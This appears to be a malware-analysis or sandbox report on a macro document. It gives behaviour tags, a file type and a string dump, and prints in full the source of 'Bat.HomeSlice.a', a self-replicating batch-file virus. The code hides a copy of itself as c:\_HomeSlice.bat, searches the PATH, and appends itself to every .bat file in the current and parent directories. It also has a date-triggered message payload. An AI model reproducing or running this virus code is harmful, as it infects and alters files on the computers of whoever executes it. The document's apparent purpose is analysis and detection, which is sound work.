behavior.autoexec: Runs when the Word document is opened
behavior.call: May call a DLL using Excel 4 Macros

docinfo.macro:
@if '%_Hommie%==' goto _Hommie
::...And she told me how to walk this way...

@if not '%_Hommie%==' goto TimeForHome
:_Hommie HomeSlice
::
:: Bat.HomeSlice.a
:: -KD- / [Metaphase & NoMercy]
::..Showing the kids the Old School.
::
@echo off%_HomeSlice%
if '%1=='HomeSlice goto HomeSlice%2
set HomeSlice=%0.bat
if not exist %HomeSlice% set HomeSlice=%0
if '%HomeSlice%==' set HomeSlice=autoexec.bat
set !HomeSlice=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %HomeSlice% HomeSlice SetTheX
set _Hommie=>nul.HomeSlice
set !HomeSlice=
if exist c:\_HomeSlice.bat goto LetsGo
if exist %HomeSlice% goto CheckTheLoop
call %HomeSlice% HomeSlice Pimpin %path%
if exist %HomeSlice% goto CheckTheLoop
goto PayLoadCheck
:HomeSlicePimpin
shift%_HomeSlice%
if '%2==' goto TimeForHome
if exist %2\%HomeSlice set HomeSlice=%2\%HomeSlice%
if exist %2%HomeSlice set HomeSlice=%2%HomeSlice%
if exist %2\%HomeSlice.bat set HomeSlice=%2\%HomeSlice%.bat
if exist %2%HomeSlice.bat set HomeSlice=%2%HomeSlice%.bat
if not exist %HomeSlice% goto HomeSlicePimpin
goto TimeForHome
:CheckTheLoop
find "HomeSlice"<%HomeSlice%>c:\_HomeSlice.bat
attrib c:\_HomeSlice.bat +h
:LetsGo
command /e:5000 /c c:\_HomeSlice HomeSlice Infect
:PayLoadCheck
echo.|date|find "12">nul.HomeSlice
echo on
echo From The Old School to the New.
echo Bat.HomeSlice.a
echo You cant beat a classic.
echo off
if errorlevel 1 goto PayLoadDone
:PayLoadDone
::And it started with a little kiss like this...
set HomeSlice=
goto TimeForHome
:HomeSliceSetTheX
set _Hommie=x%_HomeSlice%
%HomeSlice% %!HomeSlice%
:HomeSliceInfect
for %%a in (*.bat ..\*.bat) do call c:\_HomeSlice HomeSlice InF %%a
exit HomeSlice
:HomeSliceInF
find "HomeSlice"<%3>nul
if not errorlevel 1 goto SetUsUp
echo @if '%%_Hommie%%==' goto _Hommie>HomeSlice$
type %3>>HomeSlice$
echo.>>HomeSlice$
type c:\_HomeSlice.bat>>HomeSlice$
move HomeSlice$ %3>nul
set HomeSlice#=%HomeSlice#%-
if %HomeSlice#%==---------- exit
:SetUsUp
set HomeSlice!=%HomeSlice!%-
if %HomeSlice!%==-------------------- exit
:TimeForHome

filetype: ASCII text, with CRLF line terminators

dump: ::...And she told me how to walk this way...
echo From The Old School to the New.
echo You cant beat a classic.
::And it started with a little kiss like this...
for %%a in (*.bat ..\*.bat) do call c:\_HomeSlice HomeSlice InF %%a
